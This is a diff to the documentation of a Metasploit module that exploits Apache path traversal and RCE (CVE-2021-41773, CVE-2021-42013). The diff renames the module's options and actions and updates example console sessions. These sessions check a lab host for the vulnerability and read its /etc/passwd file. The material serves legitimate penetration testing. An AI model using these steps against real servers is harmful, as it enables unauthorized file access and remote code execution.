@@ -70,6 +70,10 @@ docker start CVE-2021-42013
 
 ## Options
 
+**CVE**
+
+The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013). Default: CVE-2021-42013
+
 **DEPTH**
 
 Depth for path traversal. Default: 5
@@ -78,27 +82,23 @@ Depth for path traversal. Default: 5
 
 The file you want to read. Default: `/etc/passwd`
 
-**StartMode**
-
-The module start mode. (Accepted: Traversal, RCE, Read)
-
-* Traversal: to check the vulnerability exposure, by default.
-* RCE: to check the remote code execution.
-* Read: to read remote file on the server.
-
 **TARGETURI**
 
 Base path. Default: `/cgi-bin`
 
 ## Actions
 
-**Apache 2.4.49**
+**CHECK_TRAVERSAL**
 
-Use Apache 2.4.49 Payload format (CVE-2021-41773).
+Check the vulnerability exposure, by default.
 
-**Apache 2.4.49 and 2.4.50**
+**CHECK_RCE**
 
-Use Apache 2.4.49/2.4.50 Payload format (CVE-2021-42013).
+Check the remote code execution.
+
+**READ_FILE**
+
+Read remote file on the server.
 
 ## Scenarios
 
@@ -107,12 +107,13 @@ Use Apache 2.4.49/2.4.50 Payload format (CVE-2021-42013).
 #### CVE-2021-42013 (by default)
 
 ```
-msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
-msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
-RHOSTS => 172.20.4.11
+msf6 > use auxiliary/scanner/http/apache_normalize_path
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
+rhosts => 172.20.4.11
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
 rport => 8080
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
+[!] Changing the SSL option's value may require changing RPORT!
 ssl => false
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
 verbose => true
@@ -122,23 +123,23 @@ msf6 auxiliary(scanner/http/apache_normalize_path) > run
 [*] Obtained HTTP response code 403.
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/apache_normalize_path) >
+msf6 auxiliary(scanner/http/apache_normalize_path) > 
 ```
 
 #### CVE-2021-41773
 
 ```
 msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
-msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
-RHOSTS => 172.20.4.11
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
+rhosts => 172.20.4.11
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
 rport => 8080
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
 ssl => false
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
 verbose => true
-msf6 auxiliary(scanner/http/apache_normalize_path) > set action Apache\ 2.4.49
-action => Apache 2.4.49
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg cve CVE-2021-41773
+cve => CVE-2021-41773
 msf6 auxiliary(scanner/http/apache_normalize_path) > run
 
 [+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-41773.
@@ -152,44 +153,42 @@ msf6 auxiliary(scanner/http/apache_normalize_path) >
 
 ```
 msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
-msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
-RHOSTS => 172.20.4.11
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
+rhosts => 172.20.4.11
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
 rport => 8080
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
 ssl => false
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
 verbose => true
-msf6 auxiliary(scanner/http/apache_normalize_path) > set action Apache\ 2.4.49\ and\ 2.4.50
-action => Apache 2.4.49 and 2.4.50
-msf6 auxiliary(scanner/http/apache_normalize_path) > set StartMode RCE
-StartMode => RCE
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg action CHECK_RCE
+action => CHECK_RCE
 msf6 auxiliary(scanner/http/apache_normalize_path) > run
 
 [+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013 (mod_cgi enabled).
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/apache_normalize_path) >
-
+msf6 auxiliary(scanner/http/apache_normalize_path) > 
 ```
 
 ### Read file
 
 ```
 msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
-msf6 auxiliary(scanner/http/apache_normalize_path) > setg RHOSTS 172.20.4.11
-RHOSTS => 172.20.4.11
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
+rhosts => 172.20.4.11
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
 rport => 8080
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
 ssl => false
 msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
 verbose => true
-msf6 auxiliary(scanner/http/apache_normalize_path) > set StartMode Read
-StartMode => Read
+msf6 auxiliary(scanner/http/apache_normalize_path) > setg action READ_FILE
+action => READ_FILE
 msf6 auxiliary(scanner/http/apache_normalize_path) > run
 
-[+] 172.20.4.11:8080
+[*] Obtained HTTP response code 200.
+[+] 172.20.4.11:8080 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -210,10 +209,10 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 
-[+] File saved in: /home/mekhalleh/.msf4/loot/20211008134549_default_172.20.4.11_apache.traversal_058623.bin
+[+] File saved in: /home/mekhalleh/.msf4/loot/20211010161150_default_172.20.4.11_apache.traversal_540877.bin
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/apache_normalize_path) >
+msf6 auxiliary(scanner/http/apache_normalize_path) > 
 ```
 ## References
 
